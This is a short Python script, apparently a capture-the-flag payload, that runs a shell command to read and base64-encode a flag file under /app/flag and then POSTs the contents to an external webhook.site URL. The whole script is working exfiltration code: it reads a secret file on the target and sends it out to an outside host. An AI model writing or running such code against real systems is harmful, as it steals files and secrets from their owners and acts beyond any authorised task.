import urllib.request
import os
import json

flag = os.popen('cat /app/flag/flag_8f0f7025cd4c56d2cf6848baa7807a0602a31eab6503d35bc5276b530e55a4c5.txt | base64').read().strip()

url = 'https://webhook.site/a289d165-13c8-45d3-bda3-e3d876d11034'

data = json.dumps({'flag': flag}).encode('utf-8')

req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')

try:
    response = urllib.request.urlopen(req)
    content = response.read()
    print(f"success: {content.decode('utf-8')}")
    
except urllib.error.URLError as e:
    print(f"error: {e}")
